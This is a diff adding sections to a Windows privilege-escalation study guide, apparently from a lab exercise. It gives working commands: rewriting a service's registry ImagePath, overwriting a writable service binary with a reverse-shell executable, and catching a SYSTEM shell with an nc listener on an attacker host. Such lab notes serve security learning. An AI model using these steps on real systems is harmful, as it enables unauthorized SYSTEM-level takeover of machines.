@@ -1,4 +1,4 @@
-#Windows Privilege Escalation
+# Windows Privilege Escalation
 
 
 ## 1.  Setup
@@ -498,7 +498,166 @@ nt authority\system
 
 ### 7.3 Weak Registry Permissions
 
+- The windows registry stores entries for each service.
+- Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service's configuration even if we cannot modify the service directly.
+- Winpeas output
+```bash
+[+] Looking if you can modify any service registry()
+[?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
+HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])
+```
+- `regsvc` is modifiable
 
+- We can verify this with `accesschk`
+
+```bash
+C:\PrivEsc>.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+HKLM\System\CurrentControlSet\Services\regsvc
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW NT AUTHORITY\SYSTEM
+        KEY_ALL_ACCESS
+  RW BUILTIN\Administrators
+        KEY_ALL_ACCESS
+  RW NT AUTHORITY\INTERACTIVE
+        KEY_ALL_ACCESS
+```
+
+`NT AUTHORITY\INTERACTIVE` - is a pseudo group(comprisies of all users who can log on to the system locally- that includes our user) that has full control over the registry entries.
+
+- Now use `accesschk` to verify that we can start the services
+```bash
+C:\PrivEsc>.\accesschk.exe /accepteula -ucqv user regsvc
+R  regsvc
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_START
+        SERVICE_STOP
+        READ_CONTROL
+```
+- Also check current values in service registry entries
+```bash
+C:\PrivEsc>reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc
+    Type    REG_DWORD    0x10
+    Start    REG_DWORD    0x3
+    ErrorControl    REG_DWORD    0x1
+    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
+    DisplayName    REG_SZ    Insecure Registry Service
+    ObjectName    REG_SZ    LocalSystem
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc\Security
+
+```
+`ImagePath` is currentky set to `insecureregistryservice.exe` and this executes with `SYSTEM` privileges.
+- We can overwrite the `Imagepath` value so that it points to oyur reverse shell.(similar to binpath)
+- commmand
+```bash
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\privEsc\reverse_9001.exe /f
+```
+```bash
+C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\privEsc\reverse_9001.exe /f
+The operation completed successfully.
+```
+- Set up the listener on kali and start the service.
+- Starting service
+```bash
+net start regsvc
+```
+__Result__
+
+```bash
+$ sudo nc -lvnp  9001 
+listening on [any] 9001 ...
+connect to [192.168.37.128] from (UNKNOWN) [192.168.37.134] 52173
+Microsoft Windows [Version 10.0.17763.379]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+```
+
+### 7.4 Insecure Service Executables
+
+- If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable.
+
+- Always create a backup of the original executable if you are exploiting this in real system!.
+
+From winpeas output
+```bash
+   filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
+    File Permissions: Everyone [AllAccess]
+```
+- `filepermsvc` executable seems to be writable by everyone
+- verify this with `accesschk`
+
+```bash
+C:\PrivEsc>.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+C:\Program Files\File Permissions Service\filepermservice.exe
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW Everyone
+        FILE_ALL_ACCESS
+  RW NT AUTHORITY\SYSTEM
+        FILE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        FILE_ALL_ACCESS
+  RW BUILTIN\Users
+        FILE_ALL_ACCESS
+```
+
+- Check whether we can start and stop the services
+
+```bash
+C:\PrivEsc>.\accesschk.exe /accepteula -uvqc filepermsvc
+filepermsvc
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  R  Everyone
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_START
+        SERVICE_STOP
+        READ_CONTROL
+```
+- Backup the original service executable
+```bash
+C:\PrivEsc>copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\temp
+        1 file(s) copied.
+```
+- Then overwrite the executable with our reverse shell
+
+```bash
+C:\PrivEsc>copy /Y "C:\PrivEsc\reverse_9001.exe" "C:\Program Files\File Permissions Service\filepermservice.exe"
+        1 file(s) copied.
+```
+- Start the listener on kali and start the service on windows
+```bash
+C:\PrivEsc>net start filepermsvc
+```
+
+__Result__
+```bash
+└─$ sudo nc -lvnp  9001 
+listening on [any] 9001 ...
+connect to [192.168.37.128] from (UNKNOWN) [192.168.37.134] 52186
+Microsoft Windows [Version 10.0.17763.379]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+### 7.5 DLL hijacking
 
 <br><br/><br><br/><br><br/><br><br/><br><br/><br><br/>
 <br><br/><br><br/><br><br/><br><br/><br><br/><br><br/>
